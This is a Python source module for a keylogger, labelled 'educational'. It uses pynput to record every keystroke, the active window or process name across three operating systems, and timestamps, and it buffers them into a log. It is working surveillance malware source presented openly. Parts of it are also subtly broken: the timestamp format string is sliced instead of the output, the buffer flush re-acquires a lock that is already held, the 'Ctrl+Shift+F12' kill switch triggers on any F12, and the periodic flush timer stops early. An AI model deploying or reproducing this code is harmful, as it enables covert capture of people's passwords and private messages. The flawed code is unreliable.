"""
Keylogger Core Module
Educational Purpose Only - Use Responsibly

This module implements the core keylogging functionality using pynput.
It captures keyboard events and processes them for logging.
"""

import time
import logging
import threading
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key, Listener

class KeyLogger:
    """Main keylogger class that captures and processes keyboard events."""
    
    def __init__(self, config, log_manager):
        self.config = config
        self.log_manager = log_manager
        self.listener = None
        self.running = False
        self.current_window = ""
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.logger = logging.getLogger(__name__)
        
        # Configuration options
        self.capture_special_keys = config.getboolean('KEYLOGGER', 'capture_special_keys', fallback=True)
        self.buffer_size = config.getint('KEYLOGGER', 'buffer_size', fallback=50)
        self.flush_interval = config.getint('KEYLOGGER', 'flush_interval', fallback=10)
        
        # Start buffer flush timer
        self.flush_timer = None
        self._start_flush_timer()
    
    def start(self):
        """Start the keylogger."""
        if self.running:
            self.logger.warning("Keylogger is already running")
            return
        
        try:
            self.running = True
            self.listener = Listener(on_press=self._on_key_press, on_release=self._on_key_release)
            self.listener.start()
            self.logger.info("Keylogger started successfully")
            
        except Exception as e:
            self.logger.error(f"Failed to start keylogger: {e}")
            self.running = False
            raise
    
    def stop(self):
        """Stop the keylogger."""
        if not self.running:
            return
        
        try:
            self.running = False
            
            if self.listener:
                self.listener.stop()
                self.listener = None
            
            if self.flush_timer:
                self.flush_timer.cancel()
            
            # Flush remaining buffer
            self._flush_buffer()
            
            self.logger.info("Keylogger stopped successfully")
            
        except Exception as e:
            self.logger.error(f"Error stopping keylogger: {e}")
    
    def _on_key_press(self, key):
        """Handle key press events."""
        if not self.running:
            return
        
        try:
            # Get current window title
            current_window = self._get_active_window()
            
            # Process the key
            key_info = self._process_key(key, 'press', current_window)
            
            if key_info:
                with self.buffer_lock:
                    self.key_buffer.append(key_info)
                    
                    # Flush buffer if it's full
                    if len(self.key_buffer) >= self.buffer_size:
                        self._flush_buffer()
            
            # Check for kill switch combination (Ctrl+Shift+F12)
            if self._is_kill_switch_combination(key):
                self.logger.info("Kill switch combination detected")
                self.stop()
                return False  # Stop the listener
                
        except Exception as e:
            self.logger.error(f"Error in key press handler: {e}")
    
    def _on_key_release(self, key):
        """Handle key release events."""
        if not self.running:
            return
        
        try:
            # Only log special key releases if configured
            if self.capture_special_keys and hasattr(key, 'name'):
                current_window = self._get_active_window()
                key_info = self._process_key(key, 'release', current_window)
                
                if key_info:
                    with self.buffer_lock:
                        self.key_buffer.append(key_info)
                        
        except Exception as e:
            self.logger.error(f"Error in key release handler: {e}")
    
    def _process_key(self, key, event_type, window_title):
        """Process a key event and return formatted key information."""
        try:
            timestamp = datetime.now().strftime(
                self.config.get('KEYLOGGER', 'timestamp_format', '%Y-%m-%d %H:%M:%S.%f')[:-3]
            )
            
            # Handle different key types
            if hasattr(key, 'char') and key.char is not None:
                # Regular character key
                key_name = key.char
                key_type = 'char'
            else:
                # Special key
                if hasattr(key, 'name'):
                    key_name = key.name
                else:
                    key_name = str(key)
                key_type = 'special'
            
            # Create key information dictionary
            key_info = {
                'timestamp': timestamp,
                'key': key_name,
                'key_type': key_type,
                'event_type': event_type,
                'window_title': window_title,
                'raw_key': str(key)
            }
            
            return key_info
            
        except Exception as e:
            self.logger.error(f"Error processing key: {e}")
            return None
    
    def _get_active_window(self):
        """Get the title of the currently active window."""
        try:
            import platform
            
            if platform.system() == "Windows":
                return self._get_active_window_windows()
            elif platform.system() == "Darwin":
                return self._get_active_window_macos()
            else:
                return self._get_active_window_linux()
                
        except Exception as e:
            self.logger.error(f"Error getting active window: {e}")
            return "Unknown"
    
    def _get_active_window_windows(self):
        """Get active window title on Windows."""
        try:
            import win32gui
            import win32process
            import psutil
            
            # Get the foreground window
            hwnd = win32gui.GetForegroundWindow()
            
            # Get window title
            window_title = win32gui.GetWindowText(hwnd)
            
            # Get process information
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                return f"{process_name} - {window_title}" if window_title else process_name
            except:
                return window_title if window_title else "Unknown"
                
        except Exception as e:
            self.logger.error(f"Error getting Windows active window: {e}")
            return "Unknown"
    
    def _get_active_window_macos(self):
        """Get active window title on macOS."""
        try:
            from AppKit import NSWorkspace
            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            return active_app['NSApplicationName']
        except Exception as e:
            self.logger.error(f"Error getting macOS active window: {e}")
            return "Unknown"
    
    def _get_active_window_linux(self):
        """Get active window title on Linux."""
        try:
            import subprocess
            result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
                                  capture_output=True, text=True)
            return result.stdout.strip() if result.returncode == 0 else "Unknown"
        except Exception as e:
            self.logger.error(f"Error getting Linux active window: {e}")
            return "Unknown"
    
    def _is_kill_switch_combination(self, key):
        """Check if the kill switch combination is pressed."""
        try:
            # This is a simplified check - in a real implementation,
            # you'd need to track modifier key states
            if hasattr(key, 'name') and key.name == 'f12':
                # Check if Ctrl and Shift are pressed
                # This is a basic implementation
                return True
            return False
        except:
            return False
    
    def _flush_buffer(self):
        """Flush the key buffer to log file."""
        if not self.key_buffer:
            return
        
        try:
            with self.buffer_lock:
                keys_to_log = self.key_buffer.copy()
                self.key_buffer.clear()
            
            # Format and log the keys
            for key_info in keys_to_log:
                log_entry = self._format_log_entry(key_info)
                self.log_manager.log_keystroke(log_entry)
            
        except Exception as e:
            self.logger.error(f"Error flushing buffer: {e}")
    
    def _format_log_entry(self, key_info):
        """Format a key info dictionary into a log entry string."""
        try:
            timestamp = key_info['timestamp']
            key = key_info['key']
            key_type = key_info['key_type']
            event_type = key_info['event_type']
            window = key_info['window_title']
            
            # Format special keys
            if key_type == 'special':
                if event_type == 'press':
                    key_display = f"[{key.upper()}]"
                else:
                    key_display = f"[{key.upper()}_RELEASE]"
            else:
                key_display = key
            
            # Create log entry
            log_entry = f"{timestamp} | {window} | {key_display}"
            
            return log_entry
            
        except Exception as e:
            self.logger.error(f"Error formatting log entry: {e}")
            return f"{key_info['timestamp']} | Error formatting key"
    
    def _start_flush_timer(self):
        """Start the periodic buffer flush timer."""
        if self.flush_timer:
            self.flush_timer.cancel()
        
        self.flush_timer = threading.Timer(self.flush_interval, self._periodic_flush)
        self.flush_timer.daemon = True
        self.flush_timer.start()
    
    def _periodic_flush(self):
        """Periodic buffer flush function."""
        if self.running:
            self._flush_buffer()
            self._start_flush_timer()  # Restart the timer

